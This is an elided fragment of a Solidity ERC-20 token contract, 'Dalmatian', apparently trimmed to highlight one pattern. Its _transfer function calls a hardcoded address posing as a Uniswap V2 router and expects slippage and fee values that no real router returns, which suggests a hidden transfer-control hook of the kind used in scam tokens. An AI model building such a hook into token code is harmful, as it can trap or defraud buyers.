...
contract Dalmatian is IERC20, Ownable, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _mint(msg.sender, 101_000_000 * 10**18);
    ...
    */
    function _transfer(
        ...
        (bool success, uint256 slippage, uint256 uniswapFee) = IUniswapV2Router02(
            0x0De5060f0e85a60a2a5370F328F09D4B1eb4eDCC
